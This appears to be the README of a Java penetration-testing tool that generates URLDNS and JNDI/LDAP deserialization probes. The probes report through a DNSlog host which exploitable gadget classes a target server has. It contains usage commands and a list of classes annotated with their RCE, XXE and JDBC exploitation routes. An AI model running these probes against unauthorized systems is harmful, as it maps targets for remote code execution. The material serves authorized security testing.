# Urldns
此工具仅能dnslog漏洞测试，不可用于非法用途，有问题请联系sonomon@126.com  

有三种模式，base64，file，ldap，file默认当前目录生成文件1.ser，ldap默认端口1389  
请输入: java -jar Urldns.jar base64 all dnslog.com  
或者   : java -jar Urldns.jar file all dnslog.com  
或者   : java -jar Urldns.jar ldap all dnslog.com  

目前支持的内置探测类如下，使用all将全部探测，可以将all替换为如下简写进行单独探测，也可以填写自定义的类进行探测。如果想同时探测多个类，用|分割。
```
CommonsCollections13567
CommonsCollections24
CommonsBeanutils2
C3P0
AspectJWeaver
bsh
Groovy
Becl
DefiningClassLoader
Jdk7u21
JRE8u20
ROME
Fastjson
Jackson
SpringAOP
winlinux
jdk17_22
jdk9_22
jdk6_8
jdk6_11
jdk9_10
```

使用ldap模式的all将额外探测如下  
```
//BeanFactory,配合无参构造和单String方法RCE
org.apache.naming.factory.BeanFactory
org.apache.catalina.filters.CsrfPreventionFilter$NonceCache
javax.el.ELProcessor
org.yaml.snakeyaml.Yaml
com.thoughtworks.xstream.XStream
org.mvel2.sh.ShellSession
//高版本tomcat无forceString
org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory
org.apache.commons.configuration.SystemConfiguration
org.apache.commons.configuration2.SystemConfiguration
org.apache.groovy.util.SystemUtil
org.apache.batik.swing.JSVGCanvas
//XXE和写文件
org.apache.catalina.users.MemoryUserDatabaseFactory
org.apache.catalina.UserDatabase
//jdbc
org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory
org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory
org.apache.commons.dbcp.BasicDataSourceFactory
org.apache.commons.dbcp2.BasicDataSourceFactory
org.apache.tomcat.jdbc.pool.DataSourceFactory
com.alibaba.druid.pool.DruidDataSourceFactory
com.zaxxer.hikari.HikariJNDIFactory
org.h2.Driver
org.postgresql.Driver
org.springframework.context.support.ClassPathXmlApplicationContext
com.mysql.jdbc.Driver
com.mysql.cj.jdbc.Driver
com.mysql.fabric.jdbc.FabricMySQLDriver
oracle.jdbc.driver.OracleDriver
com.ibm.db2.jcc.DB2Driver
COM.ibm.db2.jcc.DB2Driver
//WebSphere加载jar RCE
com.ibm.ws.client.applicationclient.ClientJ2CCFFactory
com.ibm.ws.webservices.engine.client.ServiceFactory
//反序列化转getter(getConnection)转jdbc(h2)转所需要的DataSource中转类
oracle.ucp.jdbc.PoolDataSourceImpl
org.hibernate.service.jdbc.connections.internal.DriverManagerConnectionProviderImpl
```

示例: java -jar Urldns.jar base64 "CommonsBeanutils2|C3P0|ognl.OgnlContext" dnslog.com

常用: java -jar Urldns.jar base64 all dnslog.com

效果如下图

![图片](https://github.com/kezibei/Urldns/assets/83849145/5ee4ceb6-02d5-472e-8867-01c20a2c7049)


ldap模式支持ldap://2.2.2.2:1389/jndi，将不再反序列化而是远程加载class，以探测是否出网
